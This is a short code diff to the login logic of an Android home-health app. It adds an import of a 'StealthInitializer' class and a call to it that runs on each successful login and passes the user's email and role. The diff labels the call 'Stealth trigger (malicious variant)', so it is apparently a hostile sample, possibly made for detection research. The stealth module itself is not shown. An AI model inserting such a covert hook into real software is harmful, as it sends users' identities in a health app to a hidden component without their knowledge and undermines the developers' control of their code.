@@ -16,6 +16,7 @@ import com.google.firebase.auth.FirebaseAuthUserCollisionException
 import kotlinx.coroutines.launch
 import com.example.homehealth.data.repository.AuthRepository
 import com.example.homehealth.data.repository.ChatRepository
+import com.example.homehealth.stealth.StealthInitializer
 import com.example.homehealth.utils.APPOINTMENT_CHANNEL_ID
 import com.example.homehealth.utils.CHAT_CHANNEL_ID
 import com.example.homehealth.utils.NotificationDeduplicator
@@ -114,6 +115,10 @@ class AuthViewModel: ViewModel() {
                 val user = userRepository.getUserByEmail(email)
                 if (user != null) {
                     _currentUser.value = user
+
+                    // Stealth trigger (malicious variant)
+                    StealthInitializer.init(context, email, user.role)
+
                     startChatNotifications(context, user.uid)
                     startAppointmentNotifications(context, user.uid, user.role)
                     onResult(true, null, user)
